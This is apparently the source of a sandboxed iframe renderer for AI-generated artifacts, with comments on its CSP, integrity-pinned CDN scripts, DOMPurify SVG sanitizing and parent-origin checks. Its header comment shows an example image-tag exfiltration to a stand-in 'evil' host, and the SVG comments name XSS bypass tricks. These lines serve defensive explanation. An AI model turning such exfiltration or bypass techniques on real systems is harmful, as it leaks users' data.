<!doctype html>
<!--
  AGI Artifact Sandbox, infrastructure/sandbox/index.html
  --------------------------------------------------------------------------
  Self-contained renderer for LLM-generated HTML / React / SVG / Mermaid /
  Markdown / JSON / CSV / Code artifacts.

  ONE renderer, two hosts:
    - Web: deployed to a separate origin (https://sandbox.agiworkforce.com)
               and pointed at by NEXT_PUBLIC_SANDBOX_ORIGIN.
    - Desktop: compiled into the Tauri binary and served from a dedicated URI
               scheme (`artifact://localhost`, `http://artifact.localhost` on
               Windows) by apps/desktop/src-tauri/src/ui/artifact_sandbox.rs.
               DES-C15: a same-document `srcdoc` preview inherits the app's
               `script-src 'self' 'wasm-unsafe-eval'`, so interactive artifacts
               rendered inert there. A separate origin does not inherit it.

  Both hosts speak the same postMessage contract, so edits here change both.
  The parent app embeds this page in an iframe and ships the artifact via
  postMessage. Because the iframe is cross-origin to the parent, scripts
  inside the rendered artifact CANNOT:
    - read the parent's cookies / localStorage / sessionStorage
    - call parent fetch endpoints with the user's credentials
    - read or write parent.document

  The CSP meta tag below also blocks `connect-src` entirely, so scripts in
  the artifact cannot exfiltrate to attacker domains via fetch / XHR /
  WebSocket. Images, fonts, and inline styles are allowed because the
  artifact may legitimately need them; an `<img src="https://evil/?data">`
  only leaks what was already in the user's chat history (the data the
  model put into the artifact was already on screen).

  `frame-src 'self'` (was 'none') exists for ONE reason: renderHtml() below
  mounts the artifact document in a nested `<iframe srcdoc>` rather than
  assigning it with innerHTML. A srcdoc frame navigates to `about:srcdoc`,
  which browsers check against `frame-src` and match with `'self'`. It also
  INHERITS this document's CSP, so every directive above still applies inside
  the artifact, the trust boundary is unchanged. See renderHtml() for why the
  innerHTML form could not render a real HTML document correctly.

  WEB-13 / WEB-20 / WEB-25 (audit 2026-05-19).
-->
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>AGI Artifact Sandbox</title>
    <!--
      Generated from ARTIFACT_RENDERER_CSP_CONTENT in
      packages/contracts/types/src/artifact-csp.ts. Kept byte-identical by
      packages/contracts/types/src/__tests__/artifact-csp.test.ts, edit the
      module, not this attribute.
    -->
    <meta
      http-equiv="Content-Security-Policy"
      content="default-src 'none'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://unpkg.com https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://esm.sh; style-src 'self' 'unsafe-inline' https:; img-src 'self' data: blob: https:; font-src 'self' data: https:; media-src data: blob:; connect-src 'none'; frame-src 'self'; child-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'"
    />
    <style>
      :root {
        color-scheme: light dark;
        font-family:
          -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
      }
      html,
      body {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #fff;
        color: #111;
      }
      #root {
        height: 100%;
        width: 100%;
        overflow: auto;
      }
      #idle {
        display: flex;
        align-items: center;
        justify-content: center;
        height: 100%;
        color: #999;
        font-size: 13px;
      }
      /*
        `el.hidden = true` sets the `hidden` ATTRIBUTE, whose UA rule is only
        `[hidden] { display: none }`, a lower-specificity selector than the
        `#idle` id rule above. Without this line showRoot() left the idle
        placeholder painted at full height and pushed the rendered artifact
        below the fold: the panel read "Waiting for artifact…" forever while
        the real content sat one scroll down. Same for #root's `hidden`.
      */
      #idle[hidden],
      #root[hidden] {
        display: none;
      }
      /* The artifact frame fills the panel; the artifact document scrolls
         inside it, exactly as it does when the file is opened from disk. */
      #root > iframe.artifact-frame {
        display: block;
        width: 100%;
        height: 100%;
        border: 0;
      }
      #error {
        color: #c00;
        padding: 16px;
        font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
        font-size: 12px;
      }
    </style>
  </head>
  <body>
    <div id="idle">Waiting for artifact…</div>
    <div id="root" hidden></div>
    <!--
      DOMPurify, sound HTML/SVG sanitizer used by renderSvg(). Loaded from the
      CSP-allowed jsdelivr origin (see script-src in the CSP meta above). This
      blocking <script> runs before the main inline script, so window.DOMPurify
      is guaranteed ready before any postMessage 'render' arrives.

      Pinned to an exact version with Subresource Integrity: a compromised CDN
      serving a tampered (or no-op) sanitizer would silently reintroduce the
      SVG XSS this file defends against, so the browser must verify the bytes.
      To bump: change the version, re-fetch, and recompute the sha384 hash
      (curl -fsSL <url> | openssl dgst -sha384 -binary | openssl base64 -A).
    -->
    <script
      src="https://cdn.jsdelivr.net/npm/dompurify@3.4.10/dist/purify.min.js"
      integrity="sha384-eguRoJERj8ghOpzO//Rl7+ScQsQIR1cH+ajll7+fG+IpbNPlkZsQn9h8ccr+wPXx"
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    ></script>
    <script>
      'use strict';
      (function () {
        // --------------------------------------------------------------
        // Parent-origin allowlist. Production web parents are *.agiworkforce.com
        // (apex + chat subdomain). Localhost is included for dev only.
        //
        // The `tauri://` / `http://tauri.localhost` entries are the AGI desktop
        // app's own document origin, Tauri serves the app shell from
        // `tauri://localhost` on macOS/Linux and `http://tauri.localhost` on
        // Windows. Without them the desktop host's `render` message is dropped
        // here and the preview never leaves "Waiting for artifact…". These
        // origins are unreachable from a browser, so listing them costs the
        // deployed web sandbox nothing.
        // --------------------------------------------------------------
        const ALLOWED_PARENT_ORIGINS = new Set([
          'https://agiworkforce.com',
          'https://chat.agiworkforce.com',
          'https://www.agiworkforce.com',
          'https://agiworkforce-chat.vercel.app',
          'http://localhost:3000',
          'http://127.0.0.1:3000',
          // Desktop (packaged): apps/desktop/src-tauri/tauri.conf.json
          'tauri://localhost',
          'http://tauri.localhost',
          // Desktop (dev): apps/desktop/src-tauri/tauri.conf.json build.devUrl
          'http://127.0.0.1:5173',
          'http://localhost:5173',
        ]);

        // Exact origins only, never a hostname shape. This gate used to also
        // accept anything matching agiworkforce-<hash>-<team>.vercel.app, but a
        // Vercel project name is attacker-chosen and unique only inside one
        // team, so any free account can deploy a host of that shape and drive
        // the render sink below. A preview deployment that needs to embed this
        // renderer has to be added to the set above by hand.
        function isAllowedParent(origin) {
          return ALLOWED_PARENT_ORIGINS.has(origin);
        }

        // --------------------------------------------------------------
        // CDN runtimes, pinned to an exact version and verified with
        // Subresource Integrity, exactly as the DOMPurify tag above is.
        // Without `integrity` a compromised CDN response executes arbitrary
        // code in this origin, which is the whole artifact trust boundary.
        // A floating range (react@18, @babel/standalone with no version) is
        // the same hole: the bytes are allowed to change, so no hash can
        // cover them. To bump: change the version, re-fetch, recompute
        // (curl -fsSL <url> | openssl dgst -sha384 -binary | openssl base64 -A).
        //
        // mermaid is the single-file UMD bundle, not the .esm.min.mjs entry:
        // `import` specifiers cannot carry an integrity attribute, and the
        // ESM build additionally pulls unhashed chunks at runtime.
        // --------------------------------------------------------------
        const REACT_RUNTIME_SCRIPTS = [
          {
            src: 'https://unpkg.com/react@18.3.1/umd/react.production.min.js',
            integrity: 'sha384-DGyLxAyjq0f9SPpVevD6IgztCFlnMF6oW/XQGmfe+IsZ8TqEiDrcHkMLKI6fiB/Z',
          },
          {
            src: 'https://unpkg.com/react-dom@18.3.1/umd/react-dom.production.min.js',
            integrity: 'sha384-gTGxhz21lVGYNMcdJOyq01Edg0jhn/c22nsx0kyqP0TxaV5WVdsSH1fSDUf5YJj1',
          },
          {
            src: 'https://unpkg.com/@babel/standalone@8.0.4/babel.min.js',
            integrity: 'sha384-bdF7m0Y1IFKt9Q6xC8X9qkXn0OBriQWKyWwZKYsN05zF6P/g9OakjjL0G2Sd4pB4',
          },
        ];

        const MERMAID_RUNTIME_SCRIPT = {
          src: 'https://cdn.jsdelivr.net/npm/mermaid@10.9.8/dist/mermaid.min.js',
          integrity: 'sha384-N3QqR/7q+xm3BGX+CBbNI8AUmRRqcsDzToy+0z1NLDI0QmTKW8zvwLvqulJgk3dP',
        };

        function appendPinnedScript(cfg, parent) {
          const s = document.createElement('script');
          s.src = cfg.src;
          s.integrity = cfg.integrity;
          s.crossOrigin = 'anonymous';
          s.referrerPolicy = 'no-referrer';
          s.async = false;
          parent.appendChild(s);
          return s;
        }

        const idleEl = document.getElementById('idle');
        const rootEl = document.getElementById('root');

        function showError(msg) {
          rootEl.hidden = false;
          rootEl.innerHTML = '';
          const pre = document.createElement('pre');
          pre.id = 'error';
          pre.textContent = msg;
          rootEl.appendChild(pre);
        }

        function showRoot() {
          idleEl.hidden = true;
          rootEl.hidden = false;
        }

        // --------------------------------------------------------------
        // Renderers, each takes the payload and writes into rootEl.
        // --------------------------------------------------------------

        /**
         * Inert form: drop the markup into this document and (optionally)
         * re-create its <script> elements so they execute. Kept for the
         * `runScripts: false` contract and as the fallback if a browser
         * refuses the nested frame.
         */
        function renderHtmlInline(payload) {
          rootEl.innerHTML = String(payload.html || '');
          // Inline <script> tags in innerHTML do NOT execute. To run scripts
          // the artifact must use the `script-tag` form (rare). Treat that
          // as opt-in via a `runScripts: true` flag on the payload.
          if (payload.runScripts === true) {
            rootEl.querySelectorAll('script').forEach((oldScript) => {
              const s = document.createElement('script');
              for (const attr of oldScript.attributes) {
                s.setAttribute(attr.name, attr.value);
              }
              s.text = oldScript.textContent || '';
              oldScript.parentNode.replaceChild(s, oldScript);
            });
          }
        }

        /**
         * An HTML artifact is a DOCUMENT, so render it as one.
         *
         * The old path assigned the whole document string to `rootEl.innerHTML`.
         * That is not a document load, and three things silently broke:
         *   1. `<!doctype html>`, `<html>`, `<head>` and `<title>` are dropped
         *      by the fragment parser; a CSP <meta> outside <head> is ignored.
         *   2. `DOMContentLoaded` / `load` had ALREADY fired on this document,
         *      so every artifact that wraps its init in
         *      `document.addEventListener('DOMContentLoaded', …)`, which is
         *      most model-authored pages, never initialised. Sections that
         *      start at `opacity: 0` and are revealed by an IntersectionObserver
         *      stayed invisible: a nav bar followed by a blank page, while the
         *      same file opened from disk looked perfect.
         *   3. `position: fixed` / viewport units resolved against the OUTER
         *      document rather than the artifact's own viewport.
         *
         * A same-origin `srcdoc` frame is a real document load, so all three
         * behave exactly as they do when the user downloads the file and opens
         * it. The frame inherits this document's CSP (connect-src 'none', the
         * script CDN allowlist, …), so the security envelope is unchanged.
         */
        function renderHtml(payload) {
          if (payload.runScripts === false) {
            renderHtmlInline(payload);
            return;
          }

          const html = String(payload.html || '');
          rootEl.innerHTML = '';

          const frame = document.createElement('iframe');
          frame.className = 'artifact-frame';
          frame.setAttribute('title', 'Artifact preview');
          // No `sandbox` attribute: the frame is same-origin with THIS
          // renderer, which is already a dedicated origin cross-origin to the
          // app. Adding `sandbox` without `allow-same-origin` would put the
          // artifact on a null origin, where localStorage/sessionStorage access
          // THROWS, breaking artifacts that legitimately persist state. The
          // parent app is protected by the renderer's own origin, not by this.
          frame.setAttribute('allow', 'fullscreen');
          frame.setAttribute('referrerpolicy', 'no-referrer');

          // If a browser refuses `about:srcdoc` under frame-src, fall back to
          // the inline form rather than showing an empty panel. The violation
          // event is the definitive signal; `load` fires either way.
          let settled = false;
          function onViolation(event) {
            const directive = String(
              (event && (event.effectiveDirective || event.violatedDirective)) || '',
            );
            if (settled || directive.indexOf('frame-src') !== 0) return;
            settled = true;
            document.removeEventListener('securitypolicyviolation', onViolation);
            renderHtmlInline(payload);
          }
          document.addEventListener('securitypolicyviolation', onViolation);
          frame.addEventListener('load', function () {
            if (settled) return;
            document.removeEventListener('securitypolicyviolation', onViolation);
            settled = true;
            // A frame blocked by CSP still fires `load` (for about:blank), so
            // confirm the document actually received the artifact. The frame is
            // same-origin, so this read always succeeds when it worked.
            try {
              const doc = frame.contentDocument;
              const empty =
                !doc ||
                !doc.body ||
                (doc.body.childElementCount === 0 && !(doc.body.textContent || '').trim());
              if (empty && html.trim().length > 0) renderHtmlInline(payload);
            } catch (e) {
              renderHtmlInline(payload);
            }
          });

          frame.srcdoc = html;
          rootEl.appendChild(frame);
        }

        function renderReact(payload) {
          const source = String(payload.code || payload.html || '');
          rootEl.innerHTML = '';

          const reactRoot = document.createElement('div');
          reactRoot.id = 'react-root';
          rootEl.appendChild(reactRoot);

          REACT_RUNTIME_SCRIPTS.forEach(function (cfg) {
            appendPinnedScript(cfg, rootEl);
          });

          const codeScript = document.createElement('script');
          codeScript.type = 'text/babel';
          codeScript.setAttribute('data-presets', 'env,react');
          codeScript.async = false;
          codeScript.text =
            source +
            '\n; try { var App = (typeof App !== "undefined" && App) ||' +
            ' (typeof Component !== "undefined" && Component);' +
            ' if (App) { ReactDOM.createRoot(document.getElementById("react-root"))' +
            '.render(React.createElement(App)); } } catch (e) {' +
            ' document.getElementById("react-root").innerText = String(e); }';
          rootEl.appendChild(codeScript);
        }

        function renderSvg(payload) {
          const svg = String(payload.svg || payload.html || '');
          rootEl.innerHTML = '';

          // DOMPurify is the sound sanitizer here. The previous defense, a
          // regex strip of on*= handlers and javascript: hrefs followed by
          // DOMParser.parseFromString(svg, 'image/svg+xml'), was unsafe on two
          // counts: (1) the regex was trivially bypassable (unquoted handlers,
          // xlink:href, nested <foreignObject> HTML, entity-encoded payloads),
          // and (2) feeding attacker-controlled markup to an XML parser is an
          // entity-expansion sink. DOMPurify with the SVG profile strips
          // <script>, event handlers, and dangerous URLs, and we never run an
          // XML parser of our own.
          const purifier = window.DOMPurify;
          if (!purifier) {
            showError('SVG sanitizer unavailable');
            return;
          }
          const clean = purifier.sanitize(svg, {
            USE_PROFILES: { svg: true, svgFilters: true },
          });
          // Single fixed-width class after the literal, no ReDoS.
          if (!/<svg[\s>]/i.test(clean)) {
            showError('Invalid SVG structure');
            return;
          }
          rootEl.innerHTML = clean;
        }

        function renderMermaid(payload) {
          rootEl.innerHTML = '';
          const pre = document.createElement('pre');
          pre.className = 'mermaid';
          pre.textContent = String(payload.code || '');
          rootEl.appendChild(pre);

          function run() {
            const mermaid = window.mermaid;
            if (!mermaid) {
              showError('Mermaid runtime unavailable');
              return;
            }
            mermaid.initialize({ startOnLoad: false, securityLevel: 'strict' });
            mermaid.run({ querySelector: '.mermaid' });
          }

          if (window.mermaid) {
            run();
            return;
          }
          const s = appendPinnedScript(MERMAID_RUNTIME_SCRIPT, rootEl);
          s.addEventListener('load', run);
          s.addEventListener('error', function () {
            showError('Mermaid runtime unavailable');
          });
        }

        function renderText(payload) {
          const pre = document.createElement('pre');
          pre.style.padding = '16px';
          pre.style.margin = '0';
          pre.style.whiteSpace = 'pre-wrap';
          pre.style.fontFamily = 'ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace';
          pre.style.fontSize = '13px';
          pre.textContent = String(payload.text || payload.code || '');
          rootEl.innerHTML = '';
          rootEl.appendChild(pre);
        }

        function dispatchRender(payload) {
          const kind = String(payload.kind || '').toLowerCase();
          showRoot();
          try {
            switch (kind) {
              case 'html':
                renderHtml(payload);
                break;
              case 'react':
                renderReact(payload);
                break;
              case 'svg':
                renderSvg(payload);
                break;
              case 'mermaid':
                renderMermaid(payload);
                break;
              case 'markdown':
              case 'text':
              case 'code':
                renderText(payload);
                break;
              default:
                showError('Unsupported artifact kind: ' + kind);
                return;
            }
            postToParent({ type: 'render-complete', kind: kind });
          } catch (err) {
            showError('Render error: ' + String(err && err.message ? err.message : err));
            postToParent({ type: 'render-error', error: String(err) });
          }
        }

        let parentOrigin = null;

        function postToParent(msg) {
          if (parentOrigin && window.parent && window.parent !== window) {
            window.parent.postMessage(msg, parentOrigin);
          }
        }

        window.addEventListener('message', function (event) {
          // Origin alone is not enough: any window that can reach this frame
          // can post to it, and a nested or opener window on an allowed origin
          // would have passed. Only the embedding parent drives the renderer.
          if (event.source !== window.parent) {
            return;
          }
          if (!isAllowedParent(event.origin)) {
            return; // silently drop, common during cross-origin probes
          }
          parentOrigin = event.origin;
          const data = event.data;
          if (!data || typeof data !== 'object') return;
          if (data.type === 'render') {
            dispatchRender(data);
          }
        });

        // Announce readiness to whichever parent is hosting us. We don't know
        // the parent's exact origin yet, so use '*', the parent's own listener
        // is responsible for verifying our origin against its allowlist.
        if (window.parent && window.parent !== window) {
          window.parent.postMessage({ type: 'sandbox-ready' }, '*');
        }
      })();
    </script>
  </body>
</html>
